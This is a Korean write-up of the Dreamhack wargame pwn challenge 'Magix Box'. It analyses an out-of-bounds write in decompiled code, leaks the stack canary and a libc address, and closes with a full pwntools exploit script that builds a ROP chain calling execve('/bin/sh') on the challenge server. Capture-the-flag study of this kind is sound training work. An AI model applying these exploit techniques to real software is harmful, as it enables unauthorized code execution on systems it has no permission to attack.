---
title: "Magix Box writeup"
date: 2026-04-04 05:00:00 +0900
categories: [Wargame, Dreamhack]
tags: [pwn, oob, rop, canary, ret2main, dreamhack]
---

## Analysis

### checksec
```
root@a237909c5b9c:/pwn/magix_box# checksec ./chall_patched 
[*] '/pwn/magix_box/chall_patched'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3ff000)
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
```

### Source Code
```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  void *v4; // [rsp+8h] [rbp-8h]

  sub_4011F6();
  v4 = malloc(0x1000u);
  if ( !v4 )
  {
    puts("malloc() error");
    exit(1);
  }
  sub_40149E((__int64)v4);
  sub_4012CA((__int64)v4);
  return 0;
}

unsigned __int64 __fastcall sub_40149E(__int64 a1)
{
  unsigned int v1; // eax
  char buf; // [rsp+1Bh] [rbp-15h] BYREF
  int i; // [rsp+1Ch] [rbp-14h]
  ssize_t v5; // [rsp+20h] [rbp-10h]
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  for ( i = 0; i <= 4095; ++i )
  {
    v5 = read(0, &buf, 1u);
    if ( v5 != 1 )
    {
      puts("read() error");
      exit(1);
    }
    v1 = buf - 48;
    if ( v1 > 0x36 || ((0x7E0000003E03FFuLL >> v1) & 1) == 0 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  return v6 - __readfsqword(0x28u);
}

unsigned __int64 __fastcall sub_4012CA(__int64 a1)
{
  int v1; // eax
  int v3; // [rsp+14h] [rbp-2Ch] BYREF
  int i; // [rsp+18h] [rbp-28h]
  int v5; // [rsp+1Ch] [rbp-24h]
  int v6; // [rsp+20h] [rbp-20h]
  char nptr[3]; // [rsp+26h] [rbp-1Ah] BYREF
  char v8[15]; // [rsp+29h] [rbp-17h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  strcpy(v8, "hello world :)");
  v3 = 0;
  v5 = 0;
  for ( i = 0; i <= 4095; ++i )
  {
    if ( !v5 )
    {
      switch ( *(_BYTE *)(i + a1) )
      {
        case 'A':
          sub_40123D(v8);
          continue;
        case 'B':
          return v9 - __readfsqword(0x28u);
        case 'C':
          sub_40125C(&v3);
          continue;
        case 'D':
          sub_40127A(&v3);
          continue;
        case 'E':
          v5 = 1;
          continue;
        default:
          exit(1);
      }
    }
    v1 = *(char *)(i + a1);
    if ( v1 > 57 )
    {
      if ( (unsigned int)(v1 - 97) > 5 )
LABEL_17:
        exit(1);
    }
    else if ( v1 < 48 )
    {
      goto LABEL_17;
    }
    if ( v5 == 1 )
    {
      v5 = 2;
    }
    else if ( v5 == 2 )
    {
      nptr[0] = *(_BYTE *)(i - 1LL + a1);
      nptr[1] = *(_BYTE *)(i + a1);
      nptr[2] = 0;
      v6 = strtol(nptr, nullptr, 16);
      sub_401298((__int64)v8, v3, v6);
      v5 = 0;
    }
  }
  return v9 - __readfsqword(0x28u);
}

_BYTE *__fastcall sub_401298(__int64 a1, int a2, char a3)
{
  _BYTE *result; // rax

  result = (_BYTE *)(a2 + a1);
  *result = a3;
  return result;
}
```

`case 'A'`는 출력을 한다. `case 'B'`는 루프를 탈출한다. `case 'C'`는 `v8` 버퍼에 접근할 인덱스를 증가시킬 수 있다. `case 'D'`는 반대로 인덱스를 감소시킬 수 있다. `case 'E'`는 switch문에서 탈출할 수 있다.

## Vulnerability Analysis

`sub_401298((__int64)v8, v3, v6);`에 OOB 취약점이 있다. 쉘을 따기 위해 libc 주소가 필요하다. main의 스택 프레임에 `__libc_start_call_main+128`의 주소가 있을 것이다. 이를 유출한 후 ret2main해서 ROP을 하는 것이 목표였다. ret2main을 위해 카나리를 유출해야 한다.

`v8` 버퍼는 저장된 카나리와 붙어 있고 `strcpy`로 복사된다. `case 'A'`에서 출력하기 위해 `v8` 버퍼의 널 종료 바이트와 카나리 첫 번째 바이트를 널 바이트가 아닌 값으로 덮어야 한다.

이후 `__libc_start_call_main+128` 유출을 위해 main의 스택 프레임 크기를 알아내야 한다.
```
root@a237909c5b9c:/pwn/magix_box# gdb -q chall_patched
   ...
pwndbg> start
   ...
pwndbg> x/100i $rip
=> 0x401110:    endbr64 
   0x401114:    xor    ebp,ebp
   0x401116:    mov    r9,rdx
   0x401119:    pop    rsi
   0x40111a:    mov    rdx,rsp
   0x40111d:    and    rsp,0xfffffffffffffff0
   0x401121:    push   rax
   0x401122:    push   rsp
   0x401123:    xor    r8d,r8d
   0x401126:    xor    ecx,ecx
   0x401128:    mov    rdi,0x401574
   0x40112f:    call   QWORD PTR [rip+0x2ebb]        # 0x403ff0
   ...
```

main의 주소가 `0x401574`인 것을 확인할 수 있다.
```
pwndbg> x/100i 0x401574
   0x401574:    endbr64 
   0x401578:    push   rbp
   0x401579:    mov    rbp,rsp
   0x40157c:    sub    rsp,0x10
```

main의 스택 프레임은 ret + sfp + 16바이트 = 32바이트이다. `v8`은 `[rbp - 0x17]`에 있으므로 ret까지의 거리는 63바이트이다. 이 거리 정보를 바탕으로 `v8`부터 main의 ret까지 널 바이트 없이 덮어준 후, `case 'A'`로 출력하면 카나리와 `__libc_start_call_main+128` 주소를 얻을 수 있다.

## Exploit

유출에 성공했다면, 유출 과정에서 덮어쓴 카나리의 첫 바이트(널바이트)를 원래 값으로 복구한 뒤, 반환 주소를 main 함수의 주소로 덮어 프로그램이 다시 입력 대기 상태로 돌아오게 한다. 이후 유출한 libc 주소를 기반으로 ROP 체인을 구성한 페이로드를 전송하여 최종적으로 쉘을 획득할 수 있다.
```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 13873)

    return r

class MagicBox:
    def __init__(self):
        self.p = b""  
        self.idx = 0
    
    def write_byte(self, idx, val):
        if idx > self.idx:
            self.inc_idx(idx - self.idx)
        elif idx < self.idx:
            self.dec_idx(self.idx - idx)
        
        self.p += b"E" + val
        self.idx = idx

    def write_bytes(self, start_idx, val):
        for i, b in enumerate(val):
            b = f"{b:02x}".encode()
            self.write_byte(start_idx + i, b)

    def inc_idx(self, cnt):
        self.p += b"C" * cnt
        self.idx += cnt

    def dec_idx(self, cnt):
        self.p += b"D" * cnt
        self.idx -= cnt

    def print(self):
        self.p += b"A"

    def end(self):
        self.p += b"B" + p8(0x37 + 48)


def main():
    r = conn()

    # Stage 1
    box = MagicBox()
    
    box.write_byte(14, b"99")
    box.write_byte(15, b"99")
    
    for i in range(23, 63):
        box.write_byte(i, b"99")              

    box.print()                                 

    box.write_byte(15, b"00")

    main_addr = p64(0x401574)
    box.write_bytes(31, main_addr)
    box.end()

    r.send(box.p)

    r.recvn(16)
    canary = b"\x00" + r.recvn(7)
    r.recvn(40)

    leak = r.recvn(6, timeout=1.0)
    if len(leak) < 6:
        log.error(f"leak failed. len: {len(leak)}")
    __libc_start_call_main = u64(leak.ljust(8, b"\x00")) - 128
    
    libc.address = __libc_start_call_main - libc.symbols["__libc_start_call_main"]
    binsh = next(libc.search(b"/bin/sh"))
    execve = libc.symbols["execve"]
    rop = ROP(libc)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    rsi_gadget = rop.find_gadget(["pop rsi", "ret"])[0]
    rdx_gadget = rop.find_gadget(["pop rdx", "pop r12", "ret"])[0]

    # Stage 2
    chain = p64(rdi_gadget)
    chain += p64(binsh)
    chain += p64(rsi_gadget)
    chain += p64(0)
    chain += p64(rdx_gadget)
    chain += p64(0)
    chain += p64(0)
    chain += p64(execve)
    
    box2 = MagicBox()

    box2.write_bytes(31, chain)
    box2.end()

    r.send(box2.p)

    r.interactive()


if __name__ == "__main__":
    main()
```